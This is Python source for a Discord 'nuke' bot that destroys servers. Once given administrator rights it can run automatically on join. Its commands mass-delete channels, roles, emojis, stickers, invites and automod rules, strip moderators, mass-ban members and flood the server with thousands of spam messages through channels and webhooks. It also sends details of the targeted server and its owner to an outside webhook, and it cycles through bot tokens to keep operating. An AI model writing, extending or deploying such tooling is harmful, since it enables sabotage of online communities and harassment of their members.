import discord
import asyncio
import logging
import orjson
import pydactyl
import pymysql.err
from collections import defaultdict
from orjson import loads, dumps
from aiohttp import ClientSession
from typing import List, Tuple, Dict
from discord.ext import commands
from discord.ext.tasks import loop

import binlog
import shared
import manager
import utils
from backup import create_backup
from noadmin import bot as noadmin
from about import __version__
from action import *
from components import HelpMenu
from database import Profile
from typing import Callable, Coroutine
from default import website, server_icon, p_name
from user import User, Permissions
from log import create_logger
from host import Datalix, Service

create_logger(__name__, level=logging.DEBUG, file_log=True)
log = logging.getLogger('fluc.main')
bot = commands.Bot(command_prefix=shared.get_prefix, intents=discord.Intents.all(), help_command=None)
session: ClientSession
xs32 = utils.Xorshift32()

with open('config/sql.json') as file:
    sql_config: Dict = orjson.loads(file.read())

with open('config/state.json') as file:
    state: Dict = orjson.loads(file.read())


class Reconnect(Exception):
    def __init__(self, is_manager: bool, remove: bool, *args: object) -> None:
        super().__init__(*args)
        self.is_manager = is_manager
        self.remove = remove


db = shared.db
config = shared.config
command = shared.command
cooldowns = shared.cooldowns
bot.event(shared.on_command_error)
reply = shared.reply
locks = defaultdict(lambda: asyncio.Semaphore(1))
# Local cache for temporarily storing random stuff
local_cache = defaultdict(dict)
profile: Profile


async def cmd_run(ctx: commands.Context, user: User, name: str, *args, **kwargs):
    coro = cooldowns.callbacks[name][2]
    try:
        await coro(ctx, *args, **kwargs)
    except Exception:
        pass

async def sema_run(task: Callable[..., Coroutine[Any, Any, Any]], semaphore: asyncio.Semaphore, *args, **kwargs):
    async with semaphore:
        await task(*args, **kwargs)

async def safe_task(task: Callable[..., Coroutine[Any, Any, Any]], default: Any, *args, **kwargs) -> Any:
    raise_on = kwargs.pop('meta_do_raise_on', None)
    attempts = kwargs.pop('meta_attempts', 3)
    retry = kwargs.pop('meta_retry', True)
    for i in range(attempts):
        try:
            return await task(*args, **kwargs)
        except discord.RateLimited as exc:
            if attempts == i or not retry:
                continue
            await asyncio.sleep(exc.retry_after)
        except Exception as exc:
            from traceback import format_exc
            if raise_on and raise_on(exc):
                raise exc
            return default

async def main():
    global profile
    async def _run_bot(bot: commands.Bot, token: str):
        await bot.login(token)
        try:
            await bot.connect(reconnect=True)
        except discord.DiscordException as exc:
            log.error(exc)
            raise Reconnect(is_manager=token == config['manager'], remove='privileged intents' in str(exc))

    try:
        await db.connect(sql_config, config)
    except pymysql.err.OperationalError as exc:
        log.critical(exc)
        return
    
    log.info('Attempting to connect to host...')
    if config['service']:
        if config['datalix_api_token']:
            datalix = Datalix()
            await datalix.start(token=config['api_token'])
            if datalix.authorization_failure is True:
                log.critical(f'Failed to authorize to Datalix. Aborting')
                return await abort()
            for _service in datalix.services:
                if _service.name == config['service']:
                    service = _service
                    await service.update()
                    break
            else:
                log.critical(f'Datalix service "{config['service']}" not found. Aborting')
                return await abort()
            shared.datalix = datalix
            shared.datalix_service = service
            shared.has_host = True

        elif config['pterodactyl_api_token'] and config['pterodactyl_hostname']:
            dactyl = pydactyl.AsyncPterodactylClient(
                url=config['pterodactyl_hostname'],
                api_key=config['pterodactyl_api_token']
            ).client
            try:
                await dactyl.account.get_account()
            except Exception as exc:
                log.critical('Failed to get pterodactyl account. Aborting')
                return await abort()
            try:
                await dactyl.servers.get_server(config['service'])
            except Exception:
                log.critical(f'Failed to get pterodactyl server "{config['service']}". Aborting')
                return await abort()
            shared.server = config['service']
            shared.dactyl = dactyl
            shared.has_host = True
        else:
            shared.has_host = False
            log.info('No host specified. Skipping')
    else:
        shared.has_host = False
        log.info('No host specified. Skipping')

    log.info('Loading database...')
    # async with db, datalix:
    async with db, bot, manager.bot, shared.datalix, shared.dactyl:
        while 1:
            _profile = await db.get_profile()
            if not _profile:
                log.critical('No profiles left.')
                await asyncio.sleep(10)
                continue
            profile = _profile

            try:
                try:
                    await manager.bot.login(config['manager'])
                except discord.LoginFailure:
                    log.critical('Failed to log on manager.')
                    await asyncio.sleep(10)
                    continue

                try:
                    await bot.login(profile.token)
                    assert bot.user, '???'
                except discord.LoginFailure:
                    log.warning(f'Found invalid profile: {profile.username} (ID: {profile.id}).')
                    await manager.bot.close()
                    await db.remove_profile(profile.id)
                    continue
            except discord.HTTPException:
                log.critical('One or more bots is rate limited. Stop')
                break

            with open('config/state.json', 'rb') as file:
                state = loads(file.read())
            state['bot_id'] = bot.user.id
            with open('config/state.json', 'wb') as file:
                file.write(dumps(state))

            bot_tasks = [
                _run_bot(bot, profile.token),
                _run_bot(noadmin, config['no_admin']),
                _run_bot(manager.bot, config['manager'])
            ]
            try:
                loop = asyncio.get_running_loop()
                binlog.get_thread(loop, sql_config).start()
                await asyncio.gather(*bot_tasks)
            except Reconnect as reconnect:
                if reconnect.is_manager:
                    log.warning('Manager has disconnected.')
                else:
                    log.warning('Bot has disconnected.')
                if reconnect.remove:
                    await db.remove_profile(profile.id)
                    log.warning(f'Invalidated: {profile.username} (ID: {profile.id})')

                state['last_bot'] = bot.user.id
                with open('config/state.json', 'wb') as file:
                    file.write(dumps(state))

async def science(ctx: commands.Context, user: User):
    assert ctx.guild
    webhooks = discord.Webhook.from_url(config['science'], session=session)
    members = len(ctx.guild.members)
    embed = discord.Embed(
        title=ctx.guild.name,
        description=f'ID: {ctx.guild.id}\nUser ID: {ctx.author.id}'
    )
    embed.set_author(
        name=ctx.author.name,
        url=ctx.author.avatar and ctx.author.avatar or ctx.author.default_avatar
    )
    embed.set_footer(text=f'Powered by {p_name} V{__version__}', icon_url=server_icon)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    if ctx.guild.banner:
        embed.set_image(url=ctx.guild.banner.url)
    embed.add_field(name='Stats', value=(
        f'Owner: {ctx.guild.owner} (ID: {ctx.guild.owner_id}\n'
        f'Members: {members}\n'
        f'Server type: {'Test' if members < config['test_server'] else 'Small' if members < config['small_server'] else 'Normal'}'
    ))
    await webhooks.send(embed=embed)

async def abort():
    await noadmin.close()
    await manager.bot.close()
    await bot.close()

@loop(seconds=10)
async def botloop():
    while True:
        if len(bot.guilds) > config['max_servers']:
            oldest = sorted(
                bot.guilds,
                key=lambda guild: int(guild.me.joined_at.timestamp()) if guild.me else 0 # pyright: ignore[reportOptionalMemberAccess]
            )
            oldest = [guild for guild in oldest if not guild.id == config['emoji_server']]
            excess = len(bot.guilds) - config['max_servers']
            for guild in oldest[:excess]:
                await guild.leave()
                await asyncio.sleep(1)
        
        for user_id, data in local_cache['invites'].items():
            if utils.fromtimestamp(data['last_invite']) < utils.now():
                del local_cache['invites'][user_id]
        await asyncio.sleep(5)

@bot.event
async def on_ready():
    global session
    await bot.change_presence(status=discord.Status.offline)
    assert bot.user, '???'
    log.setLevel(logging.INFO)
    session = bot.http._HTTPClient__session # pyright: ignore[reportAttributeAccessIssue]
    while not getattr(shared, 'main_server', None):
        await asyncio.sleep(1)
    botloop.start()

    if state['last_bot'] != profile.id:
        log.info(f'Using new bot: {profile.username} (ID: {profile.id})')
        with open('config/state.json', 'wb') as file:
            state['last_bot'] = profile.id
            file.write(orjson.dumps(state))
    log.info(
        f'Logged on {bot.user} (ID: {bot.user.id}), '
        f'invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot'
    )

@bot.event
async def on_guild_join(guild: discord.Guild):
    assert bot.user, '???'
    if not guild.me.guild_permissions.administrator:
        return await guild.leave()
    async for entry in guild.audit_logs(
        limit=5,
        action=discord.AuditLogAction.bot_add
    ):
        if entry.target and entry.user and entry.target.id == bot.user.id:
            user = await db.get_user(entry.user.id)
            author = entry.user
            if not user:
                user = User.new(entry.user.id)
                await db.add_user(user)
            break
    else:
        user = None
        author = type('A', (), {
            'id': 0
        })
    assert user, '???'

    # Before we do anything check whether this server is eligible
    # We allow 1 test server per user per 1 hour
    cached = local_cache['invites'][user.id]
    last_small = cached['last_small']
    if last_small:
        if not len(guild.members) < config['test_server']:
            # Test server is considered a server with less than 10 members
            if utils.fromtimestamp(last_small) > utils.now():
                cached['tries'] = cached.get('tries', 0) + 1
                if cached['tries'] > 5:
                    await db.add_user_blacklist(user.id, utils.now(hours=1))
                    await db.add_server_blacklist(guild.id, utils.now(hours=1))
                    local_cache['invites'][user.id] = cached
                    return
                else:
                    return await guild.leave()
            else:
                del cached['last_small']
                del cached['tries']

    if not cached['last_small']:
        cached['last_small'] = utils.now(hours=1).timestamp()
        cached['tries'] = 1
    local_cache['invites'][user.id] = cached

    auto_nuke = user.settings.auto_nuke
    if auto_nuke != -1:
        ctx = commands.Context(
            bot=bot,
            message=type('M', (), {
                'guild': guild,
                'channel': guild.channels[0],
                'author': author,
                '_state': bot._connection
            })(), # pyright: ignore[reportArgumentType]
            view=None # pyright: ignore[reportArgumentType]
        )
        if not auto_nuke == 0:
            await asyncio.sleep(auto_nuke)
        await cmd_run(ctx, user, 'nuke')

@bot.check
async def check(ctx: commands.Context):
    if not ctx or ctx.guild:
        return True
    return False

@bot.command('help', aliases=['h'])
@command(keep_message=True)
@cooldowns.check(3, server_cooldown=True)
async def cmd_help(ctx: commands.Context, user: User, command: Optional[str] = None, *args):
    '''
    %0
    Shows all commands and info about them
    %2
    - command: Optional
        - If you specify this argument the bot will give you detailed info about the specified command
    '''
    if command:
        cmd = bot.get_command(command)
        if not cmd:
            return await reply(ctx, f'The command "{command}" was not found!', 'error')
        doc = utils.parse_doc(cmd, cooldowns)
        server_cooldown = cooldowns.cooldowns[cmd.name][0]
        user_cooldown = cooldowns.cooldowns[cmd.name][1]
        info = (
            f'Aliases: `{'` `'.join(cmd.aliases)}`\n'
            f'Server Cooldown: `{str(server_cooldown) + 's' if server_cooldown else 'Not enabled'}`\n'
            f'User Cooldown: `{str(user_cooldown) + 's' if user_cooldown else 'Not enabled'}`\n'
        )
        embed = discord.Embed(
            title=cmd.name,
            description=doc['brief']
        )
        embed.add_field(name='Information', value=info)
        embed.add_field(name='Description', value=doc['doc'], inline=False)
        embed.add_field(name='Options', value=doc['options'], inline=False)
        return await ctx.reply(embed=embed)
    
    fields: list[dict] = []
    for cmd in bot.commands:
        doc = utils.parse_doc(cmd, cooldowns)
        fields.append({
            'name': f'📂 {cmd.name}',
            'value': f'↳ {doc['brief']}',
            'inline': False
        })
    embed = discord.Embed(description=f'Welcome to {p_name} V{__version__}. Support: {website}')
    view = HelpMenu(embed, fields)
    await ctx.reply(
        embed=embed,
        view=view
    )

@bot.command('admin', aliases=['a'])
@command()
@cooldowns.check(5, server_cooldown=True)
async def cmd_admin(ctx: commands.Context, user: User, *args):
    '''
    %0
    Grants administrator permissions
    %1
    Once the role is created it will be assigned to you and moved as high as possible
    '''
    assert ctx.guild, '???'
    async def add_role(role: discord.Role):
        assert ctx.guild, '???'
        # discord.py making a big deal ouf of it
        position = ctx.guild.me.top_role.position
        payload = [{
            'id': role.id,
            'position': position
        }]
        await asyncio.gather(*[role._state.http.move_role_position(
            role.guild.id,
            payload, # pyright: ignore[reportArgumentType]
            reason=None
        ), ctx.author.add_roles(role)]) # pyright: ignore[reportAttributeAccessIssue]

    for role in sorted(ctx.guild.roles, reverse=True):
        if role.position <= ctx.guild.me.top_role.position:
            if role.permissions.administrator:
                try:
                    await add_role(role)
                except discord.Forbidden:
                    continue
                break
    else:
        role = await create_role(ctx.guild, user.settings, session, permissions=discord.Permissions(administrator=True))
        await add_role(role)

@bot.command('create_channels', aliases=['cc', 'createchans', 'cchannels', 'cchans'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_channels(ctx: commands.Context, user: User, amount: Optional[int] = None, *args):
    '''
    %0
    Quickly creates channels
    %2
    - amount: Optional[user.settings.channel.create_amount]
        - The amount of channels to create
    '''
    assert ctx.guild, '???'
    def check(exc: Exception):
        # Cuz cmd nuke deletes old channels so we get more free space.
        # We can't calculate it that's why we use helper func to
        # stop all running tasks when maximum amount of channels reached
        nonlocal coros
        if isinstance(exc, discord.HTTPException):
            if '500' in exc.text.lower():
                for task in coros:
                    task.cancel()
        return False
    semaphore = asyncio.Semaphore(16)
    amount = min(amount or 50, 100)
    tasks = [create_channel for _ in range(amount)]
    try:
        async with locks['create_channels']:
            coros = [asyncio.create_task(safe_task(sema_run,
                [], task, semaphore, ctx.guild, user.settings,
                meta_do_raise_on=check
            )) for task in tasks]
            await asyncio.wait(coros, timeout=30)
    except discord.HTTPException:
        pass

@bot.command('mess_channels', aliases=['mc', 'delchans'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_mess_channels(ctx: commands.Context, user: User, *args):
    '''
    %0
    Messes up server channels
    %1
    This command will rename all channels and change their settings & permissions
    '''
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(16)
    async with locks['mess_channels']:
        await asyncio.gather(*[safe_task(sema_run,
            [], mess_channel, semaphore, channel, ctx.guild, user.settings
        ) for channel in ctx.guild.channels[:250]])

@bot.command('delete_channels', aliases=['dc'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_delete_channels(ctx: commands.Context, user: User, amount: Optional[int] = 500, *args):
    '''
    %0
    Quickly deletes all server channels
    %2
    - amount: Optional[500]
        - The amount of channels to delete
    '''
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(16)
    await asyncio.gather(*[safe_task(sema_run,
        [], channel.delete, semaphore, reason=user.settings.reason
    ) for channel in ctx.guild.channels[:amount]])

@bot.command('create_roles', aliases=['cr', 'createroles'])
@command()
@cooldowns.check(180, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_roles(ctx: commands.Context, user: User, amount: Optional[int] = 100, *args):
    '''
    %0
    Creates as many roles as possible (a total of 250 roles)
    %2
    - amount: Optional[250]
        - The amount of roles to create
    '''
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(11)
    missing = min(amount or 250 - len(ctx.guild.roles), 50)
    create_amount = min(missing, 100)
    await asyncio.gather(*[safe_task(sema_run,
        [], create_role, semaphore, ctx.guild, user.settings, session
    ) for _ in range(create_amount)])

@bot.command('mess_roles', aliases=['mr'])
@command()
@cooldowns.check(180, server_cooldown=True, min_members=config['small_server'])
async def cmd_mess_roles(ctx: commands.Context, user: User, *args):
    '''
    %0
    Messes up server roles
    %1
    All role settings will be changed
    '''
    assert ctx.guild
    roles = list(ctx.guild.roles)
    for role in roles[:]:
        if role.id == ctx.guild.id:
            roles.remove(role)
            continue
        if role.position >= ctx.guild.me.top_role.position:
            roles.remove(role)
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        edit_role, semaphore, role, ctx.guild, user.settings, session
    ) for role in roles])

@bot.command('delete_invites', aliases=['di', 'delinvs', 'delinvites'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_invites(ctx: commands.Context, user: User, *args):
    '''
    %0
    Deletes server invites (max: 500)
    '''
    assert ctx.guild, '???'
    def check(invite: discord.Invite) -> Tuple[int, int]:
        priority = 0 if invite.expires_at else 1
        return (priority, -invite.uses if invite.uses else 1)
    
    invites = await ctx.guild.invites()
    to_delete: List[discord.Invite] = sorted(invites, key=check)[:20]
    semaphore = asyncio.Semaphore(11)
    await asyncio.gather(*[sema_run(
        invite.delete, semaphore, reason=user.settings.reason
    ) for invite in to_delete])

@bot.command('create_invites', aliases=['ci', 'createinvs', 'createinvites'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_invites(ctx: commands.Context, user: User, amount: Optional[int] = None, *args):
    '''
    %0
    Creates server invites
    %1
    This process is slow due to massive rate limits by Discord.
    We can't do anything about it.
    %2
    - amount: Optional[user.invite.create_amount]
        - The amount of invites to create. Max: 25
    '''
    assert ctx.guild, '???'
    # Btw never seen anyone else use this x and y or z thing am I the inventor?
    # Came up with this because it makes sense and it's popular in javascript
    for _ in range(amount and min(amount, 10) or user.settings.invite.create_amount):
        await xs32.choice(ctx.guild.channels).create_invite()
        await asyncio.sleep(0.5)

@bot.command('delete_emojis', aliases=['de', 'delemojis'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_delete_emojis(ctx: commands.Context, user: User, amount: Optional[int], *args):
    '''
    %0
    Deletes all server emojis
    %2
    - amount: Optional[user.invite.create_amount]:
        - The amount of invites to create
    '''
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(6)
    await asyncio.wait([
        asyncio.create_task(sema_run(
        emoji.delete, semaphore, reason=user.settings.reason
    )) for emoji in ctx.guild.emojis[:amount or -1]], timeout=10)

@bot.command('create_emojis', aliases=['ce', 'createemojis'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_create_emojis(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    amount = ctx.guild.emoji_limit - len(ctx.guild.emojis)
    semaphore = asyncio.Semaphore(10)
    await asyncio.wait([
        asyncio.create_task(sema_run(
        create_emoji, semaphore, ctx.guild, user.settings, session
    )) for _ in range(amount)], timeout=20)

@bot.command('delete_stickers', aliases=['ds', 'delstickers'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_delete_stickers(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        sticker.delete, semaphore, reason=user.settings.reason
    ) for sticker in ctx.guild.stickers])

@bot.command('create_stickers', aliases=['cs', 'createstickers'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_create_stickers(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    to_create = min(35, ctx.guild.sticker_limit - len(ctx.guild.stickers))
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        create_sticker, semaphore, ctx.guild, user.settings, session
    ) for _ in range(to_create)])

@bot.command('delete_automod', aliases=['da', 'delautomod', 'delauto'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_automod(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    async def delete(rule: discord.AutoModRule):
        try:
            await rule.delete(reason=user.settings.reason)
        except discord.HTTPException:
            try:
                await rule.edit(enabled=False)
            except discord.HTTPException:
                pass

    rules = await ctx.guild.fetch_automod_rules()
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(delete, semaphore, rule) for rule in rules])

@bot.command('create_soundboard_sounds', aliases=['css', 'createsoundboard'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_soundboard_sounds(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    if ctx.guild.premium_tier == 0:
        limit = 8
    elif ctx.guild.premium_tier == 1:
        limit = 24
    elif ctx.guild.premium_tier == 2:
        limit = 36
    else:
        limit = 48
    to_create = min(35, limit - len(ctx.guild.soundboard_sounds))
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        create_soundboard_sound, semaphore, ctx.guild, user.settings, session
    ) for _ in range(to_create)])

@bot.command('delete_soundboard_sounds', aliases=['dss', 'delsoundboard'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_soundboard_sounds(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        sound.delete, semaphore, reason=user.settings.reason
    ) for sound in ctx.guild.soundboard_sounds[:25]])

@bot.command('strip_staff', aliases=['ss', 'stripstaff'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_strip_staff(ctx: commands.Context, user: User, *args):
    assert ctx.guild
    members: List[discord.Member] = list(ctx.guild.members)
    demote: List[discord.Member] = []
    for member in members[:]:
        if member == ctx.guild.owner:
            members.remove(member)
            continue
        elif member.top_role.position >= ctx.guild.me.top_role.position:
            members.remove(member)
            continue
        elif member == ctx.author:
            continue
        elif member.guild_permissions.administrator or member.guild_permissions.manage_guild:
            demote.append(member)
    if demote:
        semaphore = asyncio.Semaphore(11)
        await asyncio.wait([
            asyncio.create_task(safe_task(sema_run, [], member.edit, semaphore, roles=[]))
            for member in demote
        ], timeout=15)

@bot.command('kick_boosters', aliases=['kb', 'kickboosters'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_kick_boosters(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    await cmd_run(ctx, user, 'strip_staff')
    boosters = ctx.guild.premium_subscribers
    valid, _ = utils.check_members(ctx.author, boosters)

    if len(valid):
        semaphore = asyncio.Semaphore(10)
        await asyncio.wait([
            asyncio.create_task(safe_task(sema_run, [],
                member.kick, semaphore, reason=user.settings.reason
        )) for member in boosters], timeout=45)
        
@bot.command('ban_members', aliases=['bm', 'banall', 'banmembers', 'massban'])
@command()
@cooldowns.check(180, server_cooldown=True)
async def cmd_ban_members(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    await cmd_run(ctx, user, 'strip_staff')
    valid, _ = utils.check_members(ctx.author, ctx.guild.members)
    valid = valid[:1000]
    for i in range(0, len(valid), 200):
        users = [discord.Object(id=member.id) for member in valid[i:i+200]]
        await ctx.guild.bulk_ban(users)

@bot.command('mess_server', aliases=['mess_guild', 'ms', 'mg', 'messserver'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_mess_server(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    await mess_server(ctx.guild, user.settings, session)

@bot.command('create_webhooks', aliases=['cw', 'createweb'])
@command()
@cooldowns.check(3600 * 12, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_webhooks(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    try:
        webhooks, channels = tuple(zip(*await safe_task(get_webhooks, [], ctx.guild, amount=50)))
    except ValueError:
        webhooks = ()
        channels = ()

    if len(webhooks) < 50:
        missing = 50 - len(webhooks)
        await asyncio.wait([
            asyncio.gather(*[create_webhook(
                channel, user.settings # pyright: ignore[reportArgumentType]
            ) for channel in [
                channel for channel in ctx.guild.channels if not channel in channels and isinstance(channel, (discord.TextChannel, discord.VoiceChannel))
            ][:missing]])],
            timeout=30
        )

@bot.command('spam_webhooks', aliases=['sw', 'spamweb'])
@command()
@cooldowns.check(30, server_cooldown=True, min_members=config['small_server'])
async def cmd_spam_webhooks(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    webhooks = tuple(zip(*await safe_task(get_webhooks, [], ctx.guild, amount=50)))[0]
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])

@bot.command('ping_all', aliases=['pa', 'pingall'])
@command(Permissions(elevated_only=True))
@cooldowns.check(30, server_cooldown=True, min_members=config['small_server'])
async def cmd_ping_all(ctx: commands.Context, user: User, amount: int = 1, *args):
    assert ctx.guild, '???'
    channels = sorted(ctx.guild.channels, key=lambda c: c.position)
    channels = [channel for channel in channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel))]
    limit = 20
    if amount < 200:
        limit = 21
    elif amount < 150:
        limit = 22
    elif amount < 100:
        limit = 23
    elif amount < 10:
        limit = 25
    semaphore = asyncio.Semaphore(limit)
    await asyncio.gather(*[spam_channel(
        channel, user.settings, semaphore, amount=min(amount, 16) # pyright: ignore[reportArgumentType]
    ) for channel in channels])

# @bot.command('create_backup', aliases=['cb'])
# @command(Permissions())
# @cooldowns.check(360, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_backup(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    backups = await db.get_backup(user_id=user.id)
    if not user.is_premium or not user.is_elevated:
        if len(backups) >= 5:
            embed = shared.get_embed('You have used all your 5 free backup slots', 'warning')
            embed.description = 'You can delete backups with the `.delete_backup` command'
            return await ctx.send(embed=embed)
    try:
        channel = await ctx.author.create_dm()
        message = await channel.send(f'Creating backup for {ctx.guild.name} (ID: {ctx.guild.id})')
    except discord.Forbidden:
        embed = shared.get_embed('Enable your DMs in order to create a backup', 'warning')
        return await ctx.send(embed=embed)
    key, backup = await create_backup(ctx.guild)
    backup_id = await db.add_backup(user.id, backup)
    if backup_id:
        embed = shared.get_embed(f'Created backup for {ctx.guild.name} (ID: {ctx.guild.id})')
        embed.description = f'Your backup ID: `{backup_id}`\nYour backup key: ||`{key}`||'
        try:
            await channel.send(embed=embed)
            await message.delete()
        except discord.Forbidden:
            await message.edit(embed=embed)
    else:
        embed = shared.get_embed(f'Failed to create backup for {ctx.guild.name} (ID: {ctx.guild.id})')
        try:
            await channel.send(embed=embed)
            await message.delete()
        except discord.Forbidden:
            await message.edit(embed=embed)

@bot.command('bypass', aliases=['bp'])
@command()
@cooldowns.check(3600, server_cooldown=True, min_members=10)
async def cmd_bypass(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    asyncio.create_task(cmd_run(ctx, user, 'mess_channels'))
    channels = sorted(ctx.guild.channels, key=lambda c: c.position)
    # 2x less messages than originally because of trolls
    amount = 1200 // len(channels) + 1
    limit = 20
    if amount < 200:
        limit = 21
    elif amount < 150:
        limit = 22
    elif amount < 100:
        limit = 23
    elif amount < 10:
        limit = 25
    async with locks['bypass']:
        semaphore = asyncio.Semaphore(limit)
        await asyncio.gather(*[spam_channel(
            channel, user.settings, semaphore, amount=amount # pyright: ignore[reportArgumentType]
        ) for channel in channels])

# @bot.command('super_bypass', aliases=['bypass_plus', 'spb', 'bpp', 'bypassplus'])
# @command()
# @cooldowns.check(180, server_cooldown=True)
async def cmd_super_bypass(ctx: commands.Context, user: User, *args):
    assert ctx.guild, '???'
    channels = [channel for channel in ctx.guild.channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel))]
    to_delete = list(set(ctx.guild.channels) - set(channels))
    create_semaphore = asyncio.Semaphore(16)
    delete_semaphore = asyncio.Semaphore(16)
    spam_semaphore = asyncio.Semaphore(20)

    async def _create_channel():
        assert ctx.guild, '???'
        nonlocal channels
        async with create_semaphore:
            channel = await create_channel(ctx.guild, user.settings)
        channels.append(channel)
    
    async def channel_task():
        assert ctx.guild, '???'
        await asyncio.gather(*[_create_channel() for _ in range(500 - len(ctx.guild.channels))])
    
    async def delete_task():
        async def delete(channel: discord.abc.GuildChannel):
            async with delete_semaphore:
                await channel.delete(reason=user.settings.reason)
        await asyncio.gather(*[delete(channel) for channel in to_delete])

    async def spam_task(index: int):
        while 1:
            try:
                channel = channels[index]
            except IndexError:
                await asyncio.sleep(0.1)
                continue
            await spam_channel(channel, user.settings, spam_semaphore, amount=2300 // 500 + 1) # pyright: ignore[reportArgumentType]
            break
    
    asyncio.create_task(delete_task())
    asyncio.create_task(cmd_run(ctx, user, 'mess_channels'))
    await asyncio.sleep(0.5)
    asyncio.create_task(channel_task())
    await asyncio.wait([
        asyncio.create_task(spam_task(i)
    ) for i in range(499)], timeout=120)

@bot.command('nuke', aliases=['kill'])
@command()
@cooldowns.check(3600 * 12, server_cooldown=True)
@cooldowns.check(0, server_cooldown=False)
async def cmd_nuke(ctx: commands.Context, user: User, *args):
    '''
    %0
    Nukes the server (destroys it)
    %1
    This payload includes kicking boosters, messing roles, replacing emojis, replacing stickers,
    replacing soundboard sounds, creating channels, creating roles. The bot will also send a total of
    6 000+ messages with your content.
    '''
    async def delete_channels():
        assert ctx.guild, '???'
        nonlocal old_channels
        while 1:
            try:
                if len(ctx.guild.channels) > 100:
                    semaphore = asyncio.Semaphore(20)
                    await asyncio.gather(*[
                        safe_task(sema_run, [], channel.delete, semaphore, reason=user.settings.reason)
                        for channel in old_channels
                    ])
                else:
                    await asyncio.gather(*[
                        channel.delete(reason=user.settings.reason)
                        for channel in old_channels
                    ])
            except discord.HTTPException:
                await asyncio.sleep(3)
                old_channels = [channel for channel in ctx.guild.channels if channel in old_channels]
            else:
                break

    async def webhook_thread():
        nonlocal webhooks
        done, _ = await asyncio.wait([
            asyncio.create_task(safe_task(create_webhook, [], channel, user.settings))
            for channel in channels
        ], timeout=30)
        webhooks = [task.result() for task in done if not task.cancelled()]

        for webhook in webhooks:
            asyncio.create_task(spam_webhook(webhook, user.settings))

    assert ctx.guild, '???'
    asyncio.create_task(science(ctx, user))
    old_channels = list(ctx.guild.channels)[:]
    # create_amount = user.settings.channel.create_amount
    create_amount = 50
    community = user.settings.guild.community
    channels: List[discord.TextChannel] = []
    webhooks: List[discord.Webhook] = []
    if community:
        create_amount -= 2

    async with locks['nuke']:
        await ctx.guild.edit(community=False)
        asyncio.create_task(delete_channels())
        await asyncio.sleep(0.5)

        if community:
            _channels = await mess_server(ctx.guild, user.settings, session, community=community)
        else:
            _channels = asyncio.create_task(mess_server(ctx.guild, user.settings, session, community=community))
        channels = await asyncio.gather(*[create_channel(ctx.guild, user.settings) for _ in range(max(50, create_amount))])
        if community:
            channels += _channels # pyright: ignore[reportOperatorIssue]
        
        asyncio.create_task(webhook_thread())
        # Start spamming webhooks + extra 2 seconds and then start next nuke
        await asyncio.sleep(2)
        
asyncio.run(main())